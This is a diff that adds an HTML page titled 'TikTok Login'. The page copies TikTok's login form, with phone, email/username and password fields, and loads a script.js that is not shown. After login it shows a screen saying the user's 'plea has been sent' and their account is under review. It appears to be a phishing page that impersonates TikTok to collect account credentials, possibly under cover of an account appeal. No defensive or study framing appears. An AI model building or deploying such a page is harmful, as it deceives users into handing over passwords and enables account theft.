@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>TikTok Login</title>
+  <link rel="stylesheet" href="style.css" />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <script src="https://unpkg.com/phosphor-icons"></script>
+</head>
+<body>
+
+  <div class="header">
+    <span class="close" id="close-btn">×</span>
+    <span>Log in</span>
+    <span class="help" id="help-btn">?</span>
+  </div>
+
+  <!-- MAIN LOGIN FORM -->
+  <div class="container" id="main-container">
+    <h1>Log in</h1>
+
+    <div class="tabs">
+      <div class="tab active" id="phone-tab">Phone</div>
+      <div class="tab" id="email-tab">Email / Username</div>
+    </div>
+
+    <div id="phone-fields">
+      <div class="input-group">
+        <input type="tel" id="phone" placeholder=" " autocomplete="off" />
+        <label>Phone</label>
+      </div>
+      <div class="error-msg" id="phone-error"></div>
+    </div>
+
+    <div id="email-fields" style="display:none;">
+      <div class="input-group">
+        <input type="text" id="email-username" placeholder=" " autocomplete="off" />
+        <label>Email or username</label>
+      </div>
+      <div class="error-msg" id="email-error"></div>
+    </div>
+
+    <div class="input-group password-group">
+      <input type="password" id="password" placeholder=" " autocomplete="off" />
+      <label>Password</label>
+      <i class="ph ph-eye-slash eye-icon" id="togglePassword"></i>
+    </div>
+    <div class="error-msg" id="password-error"></div>
+
+    <a href="#" class="forgot" id="forgot-link">Forgot password?</a>
+    <button id="login-btn">Log in</button>
+  </div>
+
+  <!-- SUCCESS SCREEN (shows instantly after login) -->
+  <div id="success-screen" class="hidden">
+    <h2 style="color:#FF004F;">Success!</h2>
+    <p style="font-size:20px; margin:20px 0;">Your plea has been sent.</p>
+    <p style="color:#888;">We are reviewing your account.</p>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
